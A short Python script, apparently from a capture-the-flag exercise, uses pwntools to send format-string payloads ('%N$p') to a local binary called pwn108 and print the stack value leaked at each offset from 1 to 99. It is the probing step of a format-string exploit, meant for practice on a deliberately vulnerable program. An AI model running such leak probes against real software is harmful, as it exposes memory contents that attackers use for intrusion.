from pwn import *

for i in range(1, 100):
	p = process('./pwn108', level='error')
	p.sendlineafter(':', '')
	p.sendlineafter(':', '%{}$p'.format(i))
	p.recvlines(3)
	test = p.recvline().decode()
	test = test.split(':')[1].strip()
	print(f"{i}: {test}")
	
